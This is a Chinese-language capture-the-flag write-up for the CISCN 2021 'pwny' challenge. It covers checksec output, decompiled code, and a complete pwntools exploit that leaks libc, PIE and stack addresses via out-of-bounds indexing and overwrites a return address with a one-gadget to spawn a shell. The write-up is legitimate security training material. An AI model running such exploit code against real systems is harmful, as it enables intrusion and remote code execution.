# CISCN 2021 pwny

> CISCN 2021 初赛 第十四届全国大学生信息安全竞赛 创新实践能力赛 线上初赛 pwn
>
> challenge name: pwny
>
> file: pwny, libc-2.27.so
>
> No description
>
> writeup writer: hexhex16@outlook.com





## Warning

经测试，在kali 20.04下，大概率由于libc版本问题，使用`process("./pwny", env={'LD_PRELOAD': './libc-2.27.so'})`时会在`recvuntil("choice: ")`处`raise EOFError`。

在kali 18.04, python 3.6.6, pwntools 4.5.0, 可以使用Exploit下的脚本getshell



# checksec

```bash
$ checksec --file=pwny
RELRO       STACK CANARY  NX          PIE          RPATH     RUNPATH     Symbols     FORTIFY Fortified  Fortifiable FILE
Full RELRO  Canary found  NX enabled  PIE enabled  No RPATH  No RUNPATH  No Symbols    Yes   1          2           pwny
```





# IDA Analysis

- main函数:

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __int64 vars0[5]; // [rsp+0h] [rbp+0h] BYREF

  vars0[1] = __readfsqword(0x28u);
  sub_A10();
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1. read");
      puts("2. write");
      puts("3. exit");
      __printf_chk(1LL, "Your choice: ");
      __isoc99_scanf("%ld", vars0);
      if ( LODWORD(vars0[0]) != 2 )
        break;
      sub_BA0();                                // 2: write
    }
    if ( LODWORD(vars0[0]) == 3 )
      goto LABEL_6;
    if ( LODWORD(vars0[0]) != 1 )
      break;
    sub_B20();                                  // 1: read
  }
  puts("NO");
LABEL_6:
  exit(0);
}
```







# Exploit

> TEST PASS on kali 18.04, Python 3.6.6, pwntools 4.5.0, libc-2.27.so, ld-2.27.so
>
> 在`gdb.attach()`时，会有`[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)`，实际上gdb有运行，同时在MobaXterm无法显示gdb窗口，在虚拟机上有gdb窗口
>
> cannot run(by default): kali 1904, kali 2004

```python
from pwn import *
context.binary = './pwny'
sh = process("./pwny", env={'LD_PRELOAD': './libc-2.27.so'})
# sh = process(["./ld-2.27.so", "./pwny"], env={'LD_PRELOAD': './libc-2.27.so'})
# sh = remote("124.71.229.55", "22991")


def write(idx):
    sh.sendlineafter("Your choice: ", "1")
    sh.sendlineafter(b"Index: ", p64(idx & 0xffffffffffffffff))


def read(idx, buf='', id=1):
    # sh.sendlineafter("Your choice: ", "2")
    sh.recvuntil("choice: ")
    sh.sendline("2")
    sh.sendlineafter("Index: ", str(idx))
    if(id == 0):
        sh.send(buf)


read(256)  # qword_202060 idx=256刚好就是fd的存储位置，都在.bbs段
# 第一次 read(256) 会将fd覆盖为一个随机数？
gdb.attach(sh)
read(256)
write(-4)
sh.recvuntil("Result: ")
stderr = int(b"0x" + sh.recvline(keepends=False), 16)
libc = ELF("./libc-2.27.so")
success(hex(stderr))
libc.address = stderr - libc.sym['_IO_2_1_stderr_']
success(hex(libc.address))

write(-0x5c)
sh.recvuntil("Result: ")
pie = int(b"0x" + sh.recvline(keepends=False), 16) - 0xa00
success(hex(pie))
base = pie + 0x202060  # .bss:00202060 qword_202060 dq 100h dup(?)
success(hex(base))


def calc(addr):
    return int((addr - base) / 8)


# gdb.attach(sh,"b *$rebase(0x8b4)\nc")
environ = libc.sym['environ']
write(calc(environ))
sh.recvuntil("Result: ")
environ = int(b"0x" + sh.recvline(keepends=False), 16) - 0xa00
success(hex(environ))

read(calc(environ), p64(0xdeadbeef), 0)
stack = environ + 0x8e0
read(calc(stack + 0x70), p64(0), 0)
read(calc(stack), p64(libc.address + 0x10a41c), 0)
sh.interactive()

```



